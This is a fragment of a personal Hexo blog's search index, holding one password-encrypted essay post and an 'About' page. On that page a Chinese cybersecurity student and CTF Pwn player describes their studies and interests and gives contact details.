24568d74323555084f5830b4e4e8a9dab1c1d647b075be3e85632d7d7570c61470453a94e90fbf1400a9da2b2788225ee8b4b641ae062ddc279d63b7031c35004a9ca3c8566387910d4b5444e6097cd0266c4743ce8b181617caaf00d38dab172d04a22bd78f1d7de6be3f593be9e104deacea3f197ca426960c6dcafec4a9be4fa494e8a527c39f22359d00dfdfade51ff5c1285b549111b4df636d4f51737feebf01158072d4aac5b51d8ba23fe04495080da29ae8b343d5a33821cad51ea30be72fb8855de37ae3d564cf0c0b754add10a20b84554a456abf44b017e152696948773769a6491b2fcac8ba9005d624b7c4679c328f4b7e2945b9a3abe5420183efda93a6a4dea0c7dec881541ab0c970acabec5721ea0c3a6c27f2e6deefc5aac828428327647f82f674fb0eaa23aae77ae77debcae0bac954185a12530f49ed94ac43072847f140595fb2fbfa9f42ba9953a53968ed6a2921ee71f1826acab3236413599eb579a90747fcbc1bf388def794b04db673b164c17af0ec967e655f24c193c4d9c838800adcae723e5b4e0af2eff83048786141004500740b38df6bb741b2987a213470438664f193742f559503bf9871a0c0bb0641bba9c84cec98708a9d166439f1764034208c32f6aabb21117d51f29a7cb1dcaca8549bbaa56b906acc3e1fa38771f4ff35a37fb6117fadee8ae67e1eb33e5a3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">特定的人,特定的时间</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/2022/About/"/>
      <url>/2022/About/</url>
      
        <content type="html"><![CDATA[<p>翰青HanQi,北极落小雪,Polaris_Snowfall</p><span id="more"></span><h2 id="关于现状"><a href="#关于现状" class="headerlink" title="关于现状"></a>关于现状</h2><p>北京邮电大学网络空间安全专业大二在读<br>天璇Merak Pwn手<br>对二进制安全感兴趣,目前还在计算机基础学习中…</p><h2 id="关于未来"><a href="#关于未来" class="headerlink" title="关于未来"></a>关于未来</h2><p>以后的工作可能是车联网,内核,虚拟化的安全或者开发吧…</p><h2 id="关于爱好"><a href="#关于爱好" class="headerlink" title="关于爱好"></a>关于爱好</h2><p>maybe 音乐,散步,发呆,看世界.<br>(<del>理解机制的实现并通过其实现来解释现象?不局限于计算机,包括生物化学之类的</del></p><h2 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h2><p>如本站内容有误,请联系我修改.<br>QQ: 811614792<br>邮箱: <a href="mailto:811614792@qq.com">811614792@qq.com</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
